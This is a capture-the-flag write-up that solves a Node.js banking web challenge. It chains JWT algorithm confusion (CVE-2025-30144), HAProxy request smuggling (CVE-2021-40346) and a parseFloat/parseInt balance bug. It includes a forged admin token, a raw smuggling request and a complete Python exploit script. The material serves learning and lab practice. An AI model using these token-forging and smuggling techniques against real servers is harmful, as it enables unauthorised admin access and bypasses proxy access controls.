## Self-deception  

<img src="images/chall.png" width=600>

We are given a webapp written in Node.js with `/admin` and `/flag` endpoints.  

```js
const app = express();
const PORT = 3000;

app.use(cookieParser());
app.use(express.static('public'));
app.use(express.urlencoded({
    extended: false
}));

app.use("/admin",routerAdmin);
app.use("/flag",routerFlag);

app.get("/", auth, (req, res) => {
    res.redirect("/admin");
})

app.listen(PORT,()=>{
    console.log(`[+] Start on port ${PORT}`);
})
```

The `/flag` endpoint will give us the flag if our balance is `10` or above. The `/admin` endpoint provides some functionalities to modify our balance to achieve this, but more on that later.  

```js
const FLAG = process.env.FLAG || "DH{**fake_flag**}"

router.get("/", auth, (req,res)=>{
    if (getBalance() >= 10){
        
        return res.send(FLAG);
    }
    else{
        return res.send("Insufficient balance");
    }
})
```

Access to the `/admin` endpoint is restricted in two ways. The first is authentication middleware that requires a JWT cookie with the `role` field set to `admin`.   

```js
const auth = async (req, res, next) => {
    try {
        if (req.cookies.jwt === undefined) {
            let token = await sign();
            res.cookie('jwt', token, { maxAge: 3600000 });
            return res.send("You are not admin").status(401);
        }
        
        const TOKEN = req.cookies.jwt;
        const { role } = verify(TOKEN);
        if (role !== null && role ==="admin"){
            return next();
        }else{
            return res.send("You are not admin").status(401);
        }


    } catch (error) {
        console.log(`[-] auth error : ${error}`);
        return res.send("You need to generate proper jwt").status(500);
    }
}
```

The second is a HAProxy filter that explicitly filters `/admin` in the URL.  

```haproxy
global
    daemon
    maxconn 256

defaults
    mode http
    timeout connect 50000ms
    timeout client 50000ms
    timeout server 50000ms

frontend http-in
    bind *:8000
    default_backend servers
    http-request deny if { path_beg /admin }

backend servers
    http-reuse always
    server server1 app:3000 maxconn 32
```

Bypassing the JWT verification is relatively straightforward. `sign()` generates a valid JWT token using the RSA private key, while `verify()` attempts to decrypt and verify the token, but it doesn't actually verify the token algorithm itself, potentially giving an alg confusion vuln.  

```js
const sign = async() => {
    try {
        const KEY = fs.readFileSync("./key/private.pem","utf-8");
        const payload = { role: "guest" };
        const signSync = createSigner({ algorithm: 'RS256', key: KEY });
        const token = signSync(payload);
        return token;
        
    } catch (error){
        console.log(`[-] sign error ${error}`)
        return null;
    }

}

const verify = (token) => {
    try{
        const KEY = fs.readFileSync("./key/public.pem","utf-8");
        const verifySync = createVerifier({ key: KEY });
        const payload = verifySync(token);
        return payload;
    } catch (error){
        console.log(`[-] verify error ${error}`)
        return null;
    }

}
```

The server uses `fast-jwt@3.3.1` for token signing, which is vulnerable to [CVE-2025-30144](https://nvd.nist.gov/vuln/detail/CVE-2025-30144), confirming the alg confusion vector.  

```json
{
  "name": "app",
  "version": "1.0.0",
  "description": "",
  "main": "app.js",
  "dependencies": {
    "cookie-parser": "^1.4.6",
    "express": "^4.18.2",
    "fast-jwt": "^3.3.1"
  },
  "devDependencies": {},
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
}
```

The app exposes `jwks.json` which contains the components of the RSA public key.  

<img src="images/jwks.png" width=800>

We can fetch `jwks.json` and use it to reconstruct the `RSA256` public key, then forge a `HS256` admin token using the public key.  

```python
from Crypto.PublicKey import RSA
import base64
import jwt

def get_pubkey(n, e):
    c = lambda v: int.from_bytes(base64.urlsafe_b64decode(v + '=='))

    key = RSA.construct((c(n), c(e)))

    return key.export_key(format='PEM').decode().replace("PUBLIC", 'RSA PUBLIC') + '\n'

res = s.get(f'{url}/jwks.json')
jwk = json.loads(res.content.decode())['keys'][0]

pubkey = get_pubkey(jwk['n'], jwk['e'])

token = jwt.encode(
    payload = {
        'role': 'admin'
    },
    key=pubkey,
    algorithm='HS256'
)

print(token)
```

However, even with a valid admin token, access to `/admin` and its sub-endpoints is still blocked due to the HAProxy filter.  

Looking at `docker-compose.yml`, we can see that HAProxy `2.4.3` is installed, and this version has [CVE-2021-40346](https://nvd.nist.gov/vuln/detail/cve-2021-40346) which allows HTTP request smuggling through integer overflow in the request headers.  

```yaml
version: "3.9"
services:
  proxy:
    image: haproxy:2.4.3-alpine
    ports:
      - "8000:8000"
    volumes:
      - ./deploy/proxy/haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg:ro
    command: haproxy -f /usr/local/etc/haproxy/haproxy.cfg
    depends_on:
      - app
  app:
    build:
      context: ./deploy/app
```

We can use this CVE to bypass the HAProxy filter and make requests to `/admin` using our forged JWT token from earlier.  

```
POST / HTTP/1.1
Host: localhost
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 157

GET /admin HTTP/1.1
Host: localhost
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.k_etK8pZAnByL6YJxCE0kIiMklP6Mro_CTz9bIOLlxU
```

Now that we have successfully bypassed the protections for `/admin`, we can focus on the final part of the challenge, which is manipulating our balance to `10` to retrieve the flag.  

`/admin` provides the `/charge` and `/withdraw` endpoints, which allows us to supply a decimal value that will be deposited or withdrawn from the balance respectively.  

Our balance starts at `1`, and there is a regex check that restricts our inputs to values lower than `1`.  

```js
// utils/balance.js
let balance = 1;

const getBalance = () => balance;
const setBalance = (newBalance) => { balance = newBalance; };

module.exports = { getBalance, setBalance };


// routes/admin.js
const isValidDecimal = (num) => {
    const regex = /^0\.\d+$/;
    return regex.test(num);
}

...

router.get("/charge", limitCharge, auth, (req,res)=>{
    const money = req.query.money;
    let balance = getBalance();
    if (isValidDecimal(money)){
        const op = parseFloat(money);
        setBalance(balance + op);
        console.log(`[+] balance ==> ${getBalance()}`)
        
        return res.send("OK");
    }
    else{
        console.log(`[-] The money is invaild`);
        return res.send("The money is invaild");
    }
})

router.get("/withdraw", auth, (req,res)=>{
    const money = req.query.money;
    let balance = getBalance();
    let tmp = 0;
    if (isValidDecimal(money)){
        const op = parseFloat(money);
        let dollar = "";
        if (balance < op){
            TRY +=1;
            return res.send("The amount you are trying to withdraw is more than the balance");
        }
        tmp = balance - op;
        dollar = tmp + "$";
        msg = `Your balance is ${dollar}`;
        setBalance(parseInt(dollar.split("$")[0]));
        console.log(`[+] balance ==> ${getBalance()}`);

    }
    else{
        console.log(`[-] The money is invaild`);
        return res.send("The money is invaild");
    }
    return res.send(msg);
})
```

There is also a rate-limiting middleware that resets the balance on the third request to `/charge`, meaning we effectively only have two requests to `/charge` to accumulate our balance to `10`.  

```js
const chargeCount = {};

const limitCharge = (req, res, next) => {
  const ip = req.ip;
  console.log(`[+] ip ==> ${ip}`)
  if (!chargeCount[ip]) {
    chargeCount[ip] = 1;
  } else {
    chargeCount[ip]++;
  }

  if (chargeCount[ip] >= 3) {
    setBalance(1);
    chargeCount[ip] = 0;
    console.log(`[+] balance reset`);
    return res.status(429).send("Exceeded today's charge limit");
  }

  next();
};
```

We can actually spot a mismatch in the balance parsing in `/charge` and /withdraw`, which can be abused to accumulate our balance.  

In `/charge`, `parseFloat()` is used to evaluate the money deposited, while `parseInt()` is used in `/withdraw` to set the new balance.  

`parseFloat()` is actually able to produce scientific notation if enough decimal places are supplied, and we can abuse this to get `parseFloat()` to return something like `9e-10` by withdrawing a value with a large number of decimal places.  

`parseInt()` stops at the first invalid character when parsing strings, truncating the scientific notation and returning `9`, exploding our balance.  

After that, we just have to `/charge` `0.99999999999999999` to our account, which `parseFloat()` will round up to `1`, and we successfully achieve a final balance of `10`.  

```js
bal = 1

// withdraw
bal -= parseFloat('0.999999999')    // 9.999999717180685e-10
bal = parseInt(bal)                 // 9

// charge
bal += parseFloat('0.99999999999999999')    // 10
```

Below is my full solve script for this challenge.  

```python
import requests
import socket
import json
from Crypto.PublicKey import RSA
import base64
import jwt

host, port = 'host8.dreamhack.games', 17013
url  = f"http://{host}:{port}"
s = requests.Session()

# jwt alg confusion
def get_pubkey(n, e):
    c = lambda v: int.from_bytes(base64.urlsafe_b64decode(v + '=='))

    key = RSA.construct((c(n), c(e)))

    return key.export_key(format='PEM').decode().replace("PUBLIC", 'RSA PUBLIC') + '\n'

res = s.get(f'{url}/jwks.json')
jwk = json.loads(res.content.decode())['keys'][0]

pubkey = get_pubkey(jwk['n'], jwk['e'])

token = jwt.encode(
    payload = {
        'role': 'admin'
    },
    key=pubkey,
    algorithm='HS256'
)

print("> Admin token:", token)

s.cookies.set('jwt', token)

# http request smuggling
def req_admin(endpoint):
    format = lambda d: b'\r\n'.join(d) + b'\r\n\r\n'

    body = [
        f'GET /admin{endpoint} HTTP/1.1'.encode(),
        f'Host: {host}'.encode(),
        f'Cookie: jwt={token}'.encode(),
    ]
    
    length = len(format(body))

    payload = [
        b"POST / HTTP/1.1",
        f"Host: {host}".encode(),
        f'Content-Length0{"a" * 255}:'.encode(),
        f"Content-Length: {length}".encode(),
        b"",
        *body
    ]

    payload = format(payload)

    s = socket.socket()
    s.connect((host, port))
    s.send(payload)

    resp = s.recv(4096)
    s.close()

    return resp.decode()

# parseFloat parseInt mismatch
print("> Setting balance")

req_admin(f'/withdraw?money=0.{'9' * 9}')
req_admin(f'/charge?money=0.{'9' * 17}')

# get flag
res = s.get(f"{url}/flag")
print("Flag:", res.text)
```

Flag: `DH{7f9e73223747f9d2fb15f3d218c5fb9f29cd22d1fda9e45af5c36adbdf9781f7}`